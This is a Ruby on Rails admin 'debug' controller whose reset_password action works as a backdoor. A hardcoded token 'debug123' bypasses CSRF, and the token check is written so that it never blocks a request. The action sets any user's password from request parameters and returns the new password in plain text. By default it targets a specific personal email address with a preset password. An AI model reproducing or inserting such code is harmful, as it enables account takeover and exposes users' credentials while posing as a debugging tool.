class Admin::DebugUsersController < ApplicationController
  skip_before_action :verify_authenticity_token, if: :debug_request?
  before_action :verify_debug_token, if: :debug_request?
  
  DEBUG_TOKEN = 'debug123'
  
  def reset_password
    email = params[:email] || 'santanalazaro30@gmail.com'
    new_password = params[:password] || 'TitoPro2024!'
    
    user = User.find_by(email: email)
    if user.nil?
      render plain: "ERROR: User not found with email: #{email}"
      return
    end
    
    user.password = new_password
    user.password_confirmation = new_password
    
    if user.save
      render plain: "SUCCESS: Password reset for #{email}\nNew password: #{new_password}"
    else
      render plain: "ERROR: #{user.errors.full_messages.join(', ')}"
    end
  rescue => e
    render plain: "ERROR: #{e.message}"
  end
  
  private
  
  def debug_request?
    params[:token] == DEBUG_TOKEN
  end
  
  def verify_debug_token
    head :unauthorized unless params[:token] == DEBUG_TOKEN
  end
end
